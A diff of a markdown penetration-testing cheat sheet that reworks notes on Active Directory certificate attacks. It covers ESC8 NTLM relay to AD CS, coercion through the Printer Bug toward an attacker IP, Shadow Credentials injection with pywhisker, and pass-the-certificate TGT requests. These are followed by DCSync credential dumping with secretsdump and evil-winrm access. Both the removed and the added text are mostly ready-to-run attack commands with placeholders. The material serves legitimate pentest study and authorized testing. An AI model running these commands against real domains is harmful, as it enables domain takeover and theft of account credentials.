@@ -1,62 +1,100 @@
-### Pass the Certificate
 
-**Pass-the-Certificate** leverages X.509 certificates to obtain Kerberos Ticket Granting Tickets (TGTs) via the **PKINIT** extension. This technique is a primary component of attacks against **Active Directory Certificate Services (AD CS)** and **Shadow Credentials**.
 
----
-
-### AD CS NTLM Relay (ESC8)
-
-**Scenario:** Use when a Certificate Authority (CA) is configured with **HTTP Web Enrollment** (default at `/CertSrv`). This allows an attacker to relay captured NTLM authentication to the CA to request a certificate on behalf of the victim.
-
-#### Operational Workflow
-
-1. **Set up Relay Listener:** Start `ntlmrelayx` to intercept authentication and relay it to the AD CS web enrollment endpoint.
-2. **Coerce Authentication:** Use a method like the **Printer Bug** to force the target machine account to authenticate to the attacker's listener.
-3. **Generate Certificate:** The relay tool automatically requests a certificate from the CA using the relayed credentials and saves it as a `.pfx` file.
-4. **Request TGT:** Use the generated certificate to request a TGT via PKINIT.
-5. **Post-Exploitation:** Use the obtained TGT to perform actions like **DCSync** if a Domain Controller account was targeted.
-
-#### Command Reference
-
-|Tool|Action|Command|
-|:--|:--|:--|
-|**Impacket**|Relay NTLM to AD CS|`impacket-ntlmrelayx -t http://<TARGET_IP>/certsrv/certfnsh.asp --adcs -smb2support --template <TEMPLATE_NAME>`|
-|**PrinterBug**|Coerce auth from DC|`python3 printerbug.py <DOMAIN>/<USERNAME>:"<PASSWORD>"@<TARGET_IP> <ATTACK_IP>`|
-|**PKINITtools**|Obtain TGT from PFX|`python3 gettgtpkinit.py -cert-pfx <CERT_FILE>.pfx -dc-ip <TARGET_IP> '<DOMAIN>/<TARGET_NAME>' <OUTPUT_CCACHE_PATH>`|
-|**Impacket**|DCSync with TGT|`export KRB5CCNAME=<CCACHE_PATH> && impacket-secretsdump -k -no-pass -dc-ip <TARGET_IP> -just-dc-user <TARGET_USER> '<DOMAIN>/<ACCOUNT_NAME>'@<TARGET_HOSTNAME>`|
-
-**Note:** The `--template` value for `ntlmrelayx` is typically `KerberosAuthentication` for Domain Controllers but may vary; use `certipy` for enumeration.
+1. Check for AD CS web enrollment over HTTP at `/CertSrv`. If present, initiate ESC8 relay.
+2. If ESC8 is viable, start `ntlmrelayx` with the target template (e.g., KerberosAuthentication) and coerce the target (e.g., Printer Bug) to obtain a certificate.
+3. If web enrollment is unavailable, check BloodHound for the `AddKeyCredentialLink` edge. If found, use `pywhisker` to inject a public key and generate a certificate.
+4. With a certificate (.pfx) obtained, use `gettgtpkinit.py` to request a TGT.
+5. If the KDC does not support the certificate's EKU, use `PassTheCert` to authenticate via LDAPS.
+6. Export the resulting ccache to `KRB5CCNAME` and proceed to DCSync or remote access tools.
 
 ---
 
-### Shadow Credentials
+## AD CS NTLM Relay (ESC8)
 
-**Scenario:** Use when an attacker has **Write permissions** over a victim's `msDS-KeyCredentialLink` attribute (identified by the `AddKeyCredentialLink` edge in BloodHound).
+AD CS web enrollment is active over HTTP (default at `/CertSrv`) and a coercion method is available.
 
-#### Operational Workflow
+Listen for inbound NTLM and relay to the enrollment endpoint
 
-1. **Inject Public Key:** Use `pywhisker` to generate a certificate and write the corresponding public key to the victim's `msDS-KeyCredentialLink` attribute.
-2. **Request TGT:** Use the generated `.pfx` certificate and the password provided by `pywhisker` to acquire a TGT for the victim.
-3. **Lateral Movement:** Pass the ticket to access resources, such as connecting via **Evil-WinRM** if the user is in the Remote Management Users group.
+```
+impacket-ntlmrelayx -t http://<TARGET_IP>/certsrv/certfnsh.asp --adcs -smb2support --template <SERVICE_NAME>
+```
 
-#### Command Reference
+Trigger the Printer Bug to force machine authentication
 
-|Tool|Action|Command|
-|:--|:--|:--|
-|**pywhisker**|Add Shadow Credential|`pywhisker --dc-ip <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --target <TARGET_USER> --action add`|
-|**PKINITtools**|Request TGT|`python3 gettgtpkinit.py -cert-pfx <CERT_FILE>.pfx -pfx-pass '<CERT_PASSWORD>' -dc-ip <TARGET_IP> <DOMAIN>/<TARGET_USER> <OUTPUT_CCACHE_PATH>`|
-|**Evil-WinRM**|Connect via Kerberos|`export KRB5CCNAME=<CCACHE_PATH> && evil-winrm -i <TARGET_HOSTNAME> -r <DOMAIN>`|
+```
+python3 printerbug.py <DOMAIN>/<USERNAME>:"<PASSWORD>"@<TARGET_IP> <ATTACK_IP>
+```
 
----
+**Dangerous / misconfigured settings**
 
-### Troubleshooting & Edge Cases
+- Web enrollment allowed over HTTP instead of HTTPS
+- Print Spooler service enabled on Domain Controllers
 
-|Condition|Action/Implication|
-|:--|:--|
-|**KDC lacks PKINIT support**|If a certificate is obtained but pre-authentication fails because the KDC doesn't support the required EKU, use **PassTheCert** to authenticate via **LDAPS** instead.|
-|**libcrypto Error**|If `gettgtpkinit.py` fails with "Error detecting the version of libcrypto," install the `oscrypto` library.|
+**Gotchas**
 
-**Attack Implications:**
+- **Template mismatch** will result in no certificate being issued; verify template name with certipy.
+- **Print Spooler disabled** prevents the Printer Bug from triggering coercion.
 
-- Successfully relaying a Domain Controller's authentication via **ESC8** provides a certificate that allows for a **DCSync** attack, effectively compromising the entire domain.
-- **Shadow Credentials** allow for persistent take-over of a user or computer account without changing their actual password.
+## Shadow Credentials Injection
+
+`AddKeyCredentialLink` permissions exist over the target object, allowing modification of the `msDS-KeyCredentialLink` attribute.
+
+Inject public key and export PFX certificate
+
+```
+pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --target <USERNAME> --action add
+```
+
+**Gotchas**
+
+- **Write permissions missing** on the target's `msDS-KeyCredentialLink` attribute causes injection failure.
+
+## PKINIT Authentication (Pass-the-Certificate)
+
+Valid X.509 certificate (.pfx) for a user or machine account is present.
+
+Request TGT using certificate and save to ccache
+
+```
+python3 gettgtpkinit.py -cert-pfx <FILE_PATH> -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>' <FILE_PATH>
+```
+
+Request TGT using certificate with a PFX password
+
+```
+python3 gettgtpkinit.py -cert-pfx <FILE_PATH> -pfx-pass '<PASSWORD>' -dc-ip <DC_IP> <DOMAIN>/<USERNAME> <FILE_PATH>
+```
+
+**Edge cases**
+
+- Use `PassTheCert` if the **KDC does not support PKINIT or specific EKUs**, allowing for LDAPS authentication instead.
+
+**Gotchas**
+
+- **libcrypto version error** blocks `gettgtpkinit.py` execution; fix by installing the `oscrypto` library.
+
+## Post-Exploitation with Kerberos TGT
+
+TGT is obtained and saved as a ccache file.
+
+Set the environment variable to use the obtained TGT
+
+```
+export KRB5CCNAME=<FILE_PATH>
+```
+
+Perform DCSync as the DC machine account
+
+```
+impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user <USERNAME> '<DOMAIN>/<USERNAME>'@<TARGET_IP>
+```
+
+Authenticate via WinRM using Kerberos
+
+```
+evil-winrm -i <TARGET_IP> -r <DOMAIN>
+```
+
+**Gotchas**
+
+- **Improper krb5.conf** configuration will cause `evil-winrm` Kerberos authentication to fail.
